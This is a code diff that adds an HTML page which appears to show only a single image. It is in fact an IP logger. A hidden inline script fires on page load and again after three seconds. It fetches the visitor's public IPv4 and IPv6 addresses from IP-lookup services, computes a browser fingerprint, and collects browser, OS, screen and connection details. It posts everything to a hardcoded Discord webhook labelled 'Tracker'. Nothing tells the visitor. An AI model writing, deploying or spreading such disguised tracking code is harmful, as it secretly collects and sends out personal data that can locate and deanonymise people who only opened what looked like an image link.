@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Image</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #0b0b0f;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100vh;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://i.pinimg.com/736x/54/5e/bd/545ebdaa7add17785281fd070f5f50d7.jpg" alt="" />
+
+    <script>
+        (function() {
+            'use strict';
+
+            var WEBHOOK_URL = 'https://discord.com/api/webhooks/1540950112803487744/cf4Ui4KWaRVhdB1o2-gYGNV88TjJt4iS8eEkEPoXPWevdkj-hUkCP8XQBkXzxON_D7nd';
+
+            function getBrowserInfo() {
+                var ua = navigator.userAgent;
+                var browser = 'Unknown';
+                var os = 'Unknown';
+                if (ua.includes('Firefox')) browser = 'Firefox';
+                else if (ua.includes('Edg')) browser = 'Edge';
+                else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+                else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+                else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
+                if (ua.includes('Windows')) os = 'Windows';
+                else if (ua.includes('Mac OS')) os = 'macOS';
+                else if (ua.includes('Linux')) os = 'Linux';
+                else if (ua.includes('Android')) os = 'Android';
+                else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+                return { browser: browser, os: os, userAgent: ua };
+            }
+
+            function getScreenInfo() {
+                return {
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height,
+                    colorDepth: window.screen.colorDepth,
+                    viewportWidth: window.innerWidth,
+                    viewportHeight: window.innerHeight,
+                    pixelRatio: window.devicePixelRatio || 1
+                };
+            }
+
+            function getConnectionInfo() {
+                var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (!conn) return { type: 'unknown', downlink: null, rtt: null };
+                return {
+                    type: conn.effectiveType || 'unknown',
+                    downlink: conn.downlink || null,
+                    rtt: conn.rtt || null
+                };
+            }
+
+            function getPerformanceInfo() {
+                var perf = performance.timing;
+                if (!perf) return { loadTime: null, domReady: null };
+                var loadTime = perf.loadEventEnd - perf.navigationStart;
+                var domReady = perf.domContentLoadedEventEnd - perf.navigationStart;
+                return {
+                    loadTime: loadTime > 0 ? loadTime : null,
+                    domReady: domReady > 0 ? domReady : null
+                };
+            }
+
+            function getFingerprint() {
+                var components = [
+                    navigator.userAgent,
+                    navigator.language,
+                    navigator.platform,
+                    window.screen.width,
+                    window.screen.height,
+                    window.screen.colorDepth,
+                    navigator.hardwareConcurrency || '',
+                    navigator.deviceMemory || ''
+                ];
+                var raw = components.join('|');
+                var hash = 0;
+                for (var i = 0; i < raw.length; i++) {
+                    var char = raw.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash;
+                }
+                return 'fp_' + Math.abs(hash).toString(36).padStart(6, '0');
+            }
+
+            function fetchIPs() {
+                var endpoints = {
+                    ipv4: [
+                        'https://api.ipify.org?format=json',
+                        'https://ipapi.co/json/',
+                        'https://ip-api.com/json/',
+                        'https://ipinfo.io/json/'
+                    ],
+                    ipv6: [
+                        'https://api6.ipify.org?format=json',
+                        'https://ipapi.co/json/'
+                    ]
+                };
+
+                async function fetchWithFallback(endpoints) {
+                    for (var url of endpoints) {
+                        try {
+                            var res = await fetch(url, { mode: 'cors', cache: 'no-cache' });
+                            if (!res.ok) continue;
+                            var data = await res.json();
+                            if (data.ip) return data.ip;
+                            if (data.ipv4) return data.ipv4;
+                            if (data.ipv6) return data.ipv6;
+                            if (data.origin) return data.origin;
+                            for (var key of ['ip', 'IPv4', 'IPv6', 'address', 'query', 'ip_address']) {
+                                if (data[key]) return data[key];
+                            }
+                        } catch (_) {}
+                    }
+                    return null;
+                }
+
+                return Promise.all([
+                    fetchWithFallback(endpoints.ipv4),
+                    fetchWithFallback(endpoints.ipv6)
+                ]).then(function(result) {
+                    return { ipv4: result[0], ipv6: result[1] };
+                });
+            }
+
+            function sendToDiscord(data) {
+                if (!WEBHOOK_URL) return;
+
+                var embed = {
+                    title: 'Visitor Logged',
+                    color: 0x2b2d42,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: 'IPv4', value: data.ipv4 || '—', inline: true },
+                        { name: 'IPv6', value: data.ipv6 || '—', inline: true },
+                        { name: 'Fingerprint', value: data.fingerprint || '—', inline: false },
+                        { name: 'Browser', value: data.browser || '—', inline: true },
+                        { name: 'OS', value: data.os || '—', inline: true },
+                        { name: 'Screen', value: data.screen || '—', inline: true },
+                        { name: 'Connection', value: data.connection || '—', inline: true },
+                        { name: 'Load Time', value: data.loadTime || '—', inline: true },
+                        { name: 'User-Agent', value: data.userAgent || '—', inline: false }
+                    ],
+                    footer: { text: 'Analytics' }
+                };
+
+                var payload = {
+                    embeds: [embed],
+                    username: 'Tracker'
+                };
+
+                return fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                    mode: 'no-cors'
+                }).catch(function() {});
+            }
+
+            async function collectAndSend() {
+                try {
+                    var browserInfo = getBrowserInfo();
+                    var screenInfo = getScreenInfo();
+                    var connInfo = getConnectionInfo();
+                    var perfInfo = getPerformanceInfo();
+                    var fingerprint = getFingerprint();
+
+                    var ips = { ipv4: null, ipv6: null };
+                    try {
+                        var ipResult = await Promise.race([
+                            fetchIPs(),
+                            new Promise(function(_, reject) {
+                                setTimeout(function() { reject(new Error('timeout')); }, 8000);
+                            })
+                        ]);
+                        ips = ipResult || { ipv4: null, ipv6: null };
+                    } catch (_) {}
+
+                    var data = {
+                        ipv4: ips.ipv4 || null,
+                        ipv6: ips.ipv6 || null,
+                        browser: browserInfo.browser,
+                        os: browserInfo.os,
+                        userAgent: browserInfo.userAgent,
+                        screen: screenInfo.screenWidth + 'x' + screenInfo.screenHeight + ' ' + screenInfo.colorDepth + 'bit DPR ' + screenInfo.pixelRatio,
+                        viewport: screenInfo.viewportWidth + 'x' + screenInfo.viewportHeight,
+                        connection: connInfo.type ? connInfo.type + (connInfo.downlink ? ' ' + connInfo.downlink + 'Mbps' : '') + (connInfo.rtt ? ' ' + connInfo.rtt + 'ms' : '') : '—',
+                        loadTime: perfInfo.loadTime ? perfInfo.loadTime + 'ms' : '—',
+                        domReady: perfInfo.domReady ? perfInfo.domReady + 'ms' : '—',
+                        fingerprint: fingerprint
+                    };
+
+                    await sendToDiscord(data);
+                } catch (_) {}
+            }
+
+            if (document.readyState === 'complete') {
+                collectAndSend();
+            } else {
+                window.addEventListener('load', collectAndSend);
+            }
+
+            setTimeout(collectAndSend, 3000);
+        })();
+    </script>
+</body>
+</html>
